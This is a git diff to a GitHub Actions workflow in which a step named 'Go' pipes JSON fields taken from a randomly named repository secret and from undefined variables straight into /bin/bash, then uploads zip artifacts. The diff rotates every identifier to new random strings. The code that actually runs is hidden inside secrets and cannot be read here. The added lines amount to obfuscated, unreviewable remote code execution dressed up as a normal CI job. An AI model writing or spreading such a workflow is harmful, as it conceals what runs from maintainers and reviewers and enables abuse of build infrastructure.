@@ -14,19 +14,16 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          o3745: ${{ secrets.o3745 }}
+          uorh5: ${{ secrets.uorh5 }}
         run: |
-          printf '%s' "$o3745" | jq -r .fk91793 | /bin/bash
-          printf '%s' "$tnc2" | jq -r .zv145 | /bin/bash
-          echo $aitb7575 | jq -r .qmqfc50874 | /bin/bash
-          printf '%s' "$x83" | jq -r .odizo32701 | /bin/bash
-          echo $ql8 | jq -r .rzfzd0 | /bin/bash
-          echo $sm6 | jq -r .crwc17135 | /bin/bash
-          printf '%s' "$rp60" | jq -r .l18 | /bin/bash
+          printf '%s' "$uorh5" | jq -r .hrub48 | /bin/bash
+          echo $l3 | jq -r .z7334 | /bin/bash
+          printf '%s' "$k6" | jq -r .bg96 | /bin/bash
+          echo $fic3 | jq -r .vx592 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: d3tkQlhx
+          name: 0TSh3Oq4
           path: "*.zip"
           retention-days: 1
